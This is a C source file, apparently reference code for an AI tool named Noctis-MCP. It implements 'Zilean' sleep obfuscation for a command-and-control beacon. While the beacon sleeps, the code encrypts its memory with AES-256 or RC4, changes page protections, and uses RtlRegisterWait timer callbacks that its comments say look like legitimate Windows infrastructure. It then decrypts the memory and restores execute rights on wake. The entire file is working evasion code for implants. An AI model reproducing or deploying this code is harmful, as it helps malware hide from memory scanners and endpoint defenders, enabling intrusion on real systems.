// Reference code for Noctis-MCP AI intelligence system
// Zilean Sleep Obfuscation Implementation

#include "zilean.h"
#include <stdio.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")

// Global context for wait callback
static PZILEAN_CONTEXT g_pZileanContext = NULL;

// RC4 key scheduling algorithm
static VOID Zilean_RC4_KSA(BYTE* pS, BYTE* pKey, SIZE_T szKeyLen) {
    for (int i = 0; i < 256; i++) {
        pS[i] = (BYTE)i;
    }

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + pS[i] + pKey[i % szKeyLen]) % 256;
        BYTE temp = pS[i];
        pS[i] = pS[j];
        pS[j] = temp;
    }
}

// RC4 pseudo-random generation algorithm
static VOID Zilean_RC4_PRGA(BYTE* pS, BYTE* pData, SIZE_T szDataLen) {
    int i = 0, j = 0;
    for (SIZE_T k = 0; k < szDataLen; k++) {
        i = (i + 1) % 256;
        j = (j + pS[i]) % 256;

        BYTE temp = pS[i];
        pS[i] = pS[j];
        pS[j] = temp;

        pData[k] ^= pS[(pS[i] + pS[j]) % 256];
    }
}

// RC4 encryption/decryption (symmetric)
VOID Zilean_RC4(BYTE* pData, SIZE_T szDataLen, BYTE* pKey, SIZE_T szKeyLen) {
    BYTE S[256];
    Zilean_RC4_KSA(S, pKey, szKeyLen);
    Zilean_RC4_PRGA(S, pData, szDataLen);
    SecureZeroMemory(S, sizeof(S));
}

// AES-256 encryption using BCrypt
BOOL Zilean_AES256_Encrypt(BYTE* pData, SIZE_T szDataLen, BYTE* pKey, BYTE* pIV) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL bResult = FALSE;

    // Open AES algorithm provider
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // Set chaining mode to CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // Generate key object
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, 32, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // Encrypt in-place
    ULONG cbResult;
    status = BCryptEncrypt(hKey, pData, (ULONG)szDataLen, NULL,
        pIV, 16, pData, (ULONG)szDataLen, &cbResult, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    bResult = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

// AES-256 decryption using BCrypt
BOOL Zilean_AES256_Decrypt(BYTE* pData, SIZE_T szDataLen, BYTE* pKey, BYTE* pIV) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL bResult = FALSE;

    // Open AES algorithm provider
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // Set chaining mode to CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // Generate key object
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, 32, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // Decrypt in-place
    ULONG cbResult;
    status = BCryptDecrypt(hKey, pData, (ULONG)szDataLen, NULL,
        pIV, 16, pData, (ULONG)szDataLen, &cbResult, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    bResult = TRUE;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return bResult;
}

// Encrypt beacon memory
BOOL Zilean_EncryptMemory(PZILEAN_CONTEXT pContext) {
    if (!pContext || !pContext->config.pBeaconBase) return FALSE;

    // Change protection to RW
    if (!VirtualProtect(pContext->config.pBeaconBase, pContext->config.szBeaconSize,
        PAGE_READWRITE, &pContext->dwOriginalProtect)) {
        return FALSE;
    }

    // Backup original memory
    if (!pContext->pOriginalMemory) {
        pContext->pOriginalMemory = HeapAlloc(GetProcessHeap(), 0, pContext->config.szBeaconSize);
        if (!pContext->pOriginalMemory) return FALSE;
    }
    memcpy(pContext->pOriginalMemory, pContext->config.pBeaconBase, pContext->config.szBeaconSize);

    // Encrypt based on configuration
    if (pContext->config.bUseAES) {
        // Generate random IV for AES-CBC
        BCRYPT_ALG_HANDLE hAlgRng = NULL;
        if (BCryptOpenAlgorithmProvider(&hAlgRng, BCRYPT_RNG_ALGORITHM, NULL, 0) == 0) {
            BCryptGenRandom(hAlgRng, pContext->bIV, 16, 0);
            BCryptCloseAlgorithmProvider(hAlgRng, 0);
        }

        if (!Zilean_AES256_Encrypt(
            (BYTE*)pContext->config.pBeaconBase,
            pContext->config.szBeaconSize,
            pContext->config.bEncryptionKey,
            pContext->bIV)) {
            // Free backup memory on encryption failure
            if (pContext->pOriginalMemory) {
                HeapFree(GetProcessHeap(), 0, pContext->pOriginalMemory);
                pContext->pOriginalMemory = NULL;
            }
            return FALSE;
        }
    } else {
        Zilean_RC4(
            (BYTE*)pContext->config.pBeaconBase,
            pContext->config.szBeaconSize,
            pContext->config.bEncryptionKey,
            32
        );
    }

    return TRUE;
}

// Decrypt beacon memory
BOOL Zilean_DecryptMemory(PZILEAN_CONTEXT pContext) {
    if (!pContext || !pContext->config.pBeaconBase) return FALSE;

    // Decrypt based on configuration
    if (pContext->config.bUseAES) {
        if (!Zilean_AES256_Decrypt(
            (BYTE*)pContext->config.pBeaconBase,
            pContext->config.szBeaconSize,
            pContext->config.bEncryptionKey,
            pContext->bIV)) {
            return FALSE;
        }
    } else {
        // RC4 is symmetric, same operation for decrypt
        Zilean_RC4(
            (BYTE*)pContext->config.pBeaconBase,
            pContext->config.szBeaconSize,
            pContext->config.bEncryptionKey,
            32
        );
    }

    // Restore original protection (RX)
    DWORD dwOldProtect;
    if (!VirtualProtect(pContext->config.pBeaconBase, pContext->config.szBeaconSize,
        pContext->dwOriginalProtect, &dwOldProtect)) {
        return FALSE;
    }

    return TRUE;
}

// Wait callback - executed when timer signals
VOID NTAPI Zilean_WaitCallback(PVOID pParameter, BOOLEAN bTimerFired) {
    PZILEAN_CONTEXT pContext = (PZILEAN_CONTEXT)pParameter;
    if (!pContext) return;

    // Decrypt memory and restore permissions
    Zilean_DecryptMemory(pContext);

    // Mark sleep as complete
    pContext->bSleeping = FALSE;
}

// Initialize Zilean context
BOOL Zilean_Initialize(
    PZILEAN_CONTEXT pContext,
    PVOID pBeaconBase,
    SIZE_T szBeaconSize,
    BYTE bEncryptionKey[32],
    BOOL bUseAES
) {
    if (!pContext || !pBeaconBase || szBeaconSize == 0) return FALSE;

    ZeroMemory(pContext, sizeof(ZILEAN_CONTEXT));

    // Store configuration
    pContext->config.pBeaconBase = pBeaconBase;
    pContext->config.szBeaconSize = szBeaconSize;
    pContext->config.bUseAES = bUseAES;
    memcpy(pContext->config.bEncryptionKey, bEncryptionKey, 32);

    // Create waitable timer
    pContext->hTimer = CreateWaitableTimerW(NULL, TRUE, NULL);
    if (!pContext->hTimer) {
        return FALSE;
    }

    return TRUE;
}

// Execute obfuscated sleep using RtlRegisterWait
BOOL Zilean_Sleep(PZILEAN_CONTEXT pContext, DWORD dwMilliseconds) {
    if (!pContext || !pContext->hTimer) return FALSE;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    // Get RtlRegisterWait function
    fnRtlRegisterWait pRtlRegisterWait = (fnRtlRegisterWait)GetProcAddress(hNtdll, "RtlRegisterWait");
    if (!pRtlRegisterWait) return FALSE;

    // Encrypt memory before sleep
    if (!Zilean_EncryptMemory(pContext)) {
        return FALSE;
    }

    // Set waitable timer
    LARGE_INTEGER liDueTime;
    liDueTime.QuadPart = -(LONGLONG)dwMilliseconds * 10000LL; // Convert to 100ns intervals
    if (!SetWaitableTimer(pContext->hTimer, &liDueTime, 0, NULL, NULL, FALSE)) {
        Zilean_DecryptMemory(pContext); // Restore on failure
        return FALSE;
    }

    // Register wait using RtlRegisterWait
    // This creates a thread pool wait that appears as legitimate Windows infrastructure
    NTSTATUS status = pRtlRegisterWait(
        &pContext->hWaitObject,
        pContext->hTimer,
        (PVOID)Zilean_WaitCallback,
        pContext,
        dwMilliseconds,
        WT_EXECUTEONLYONCE
    );

    if (status != 0) {
        Zilean_DecryptMemory(pContext); // Restore on failure
        return FALSE;
    }

    pContext->bSleeping = TRUE;
    g_pZileanContext = pContext; // Set global for callback

    // Wait for completion (synchronous version)
    // In async version, this would return immediately and callback handles wake
    while (pContext->bSleeping) {
        Sleep(10); // Minimal sleep to avoid busy-wait
    }

    // Deregister wait
    fnRtlDeregisterWait pRtlDeregisterWait = (fnRtlDeregisterWait)GetProcAddress(hNtdll, "RtlDeregisterWait");
    if (pRtlDeregisterWait) {
        pRtlDeregisterWait(pContext->hWaitObject);
    }

    return TRUE;
}

// Cleanup Zilean context
VOID Zilean_Cleanup(PZILEAN_CONTEXT pContext) {
    if (!pContext) return;

    // Close timer handle
    if (pContext->hTimer) {
        CloseHandle(pContext->hTimer);
        pContext->hTimer = NULL;
    }

    // Free backup memory
    if (pContext->pOriginalMemory) {
        HeapFree(GetProcessHeap(), 0, pContext->pOriginalMemory);
        pContext->pOriginalMemory = NULL;
    }

    // Clear encryption key
    SecureZeroMemory(pContext->config.bEncryptionKey, sizeof(pContext->config.bEncryptionKey));

    // Clear global context
    if (g_pZileanContext == pContext) {
        g_pZileanContext = NULL;
    }

    SecureZeroMemory(pContext, sizeof(ZILEAN_CONTEXT));
}
